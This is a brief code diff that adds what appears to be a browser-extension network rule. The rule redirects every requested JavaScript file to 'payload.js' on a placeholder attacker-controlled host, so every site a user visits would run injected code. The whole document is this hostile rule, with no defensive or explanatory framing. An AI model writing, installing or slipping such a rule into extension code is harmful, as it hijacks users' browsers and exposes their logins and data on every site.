@@ -1,0 +1,14 @@
+{
+  id: 1,
+  priority: 1,
+  action: {
+    type: "redirect",
+    redirect: {
+      url: "https://your-controlled-site.com/payload.js"
+    }
+  },
+  condition: {
+    regexFilter: ".*\\.js$",
+    resourceTypes: ["script"]
+  }
+}
